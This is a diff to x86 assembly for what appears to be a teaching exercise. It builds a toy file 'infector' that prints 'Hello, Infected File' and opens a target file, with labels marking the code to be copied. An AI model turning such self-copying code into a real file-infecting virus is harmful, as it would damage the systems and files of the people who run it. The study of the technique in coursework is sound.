@@ -1,7 +1,7 @@
 section .data
     MSG db "Hello, Infected File", 0
     outfile dd 1
-    MSG_LEN EQU 20
+    MSG_LEN EQU $-MSG
     STDOUT EQU 1
     WRITE EQU 4
     OPEN EQU 5
@@ -12,6 +12,7 @@ section .data
 section .text
 global _start
 global system_call
+global infector
 global code_start
 extern main
 
@@ -54,10 +55,6 @@ system_call:
 
 code_start:
 infection:
-    push    ebp             ; Save caller state
-    mov     ebp, esp
-    pushad                  ; Save some more caller state
-
     ; Print message
     push    MSG_LEN
     push    MSG
@@ -65,8 +62,11 @@ infection:
     push    WRITE
     call    system_call
     add     esp, 16
-
 infector:
+    push    ebp             ; Save caller state
+    mov     ebp, esp
+    pushad                  ; Save some more caller state
+
     ; Open file
     push    PERMISSIONS
     push    O_FLAGS
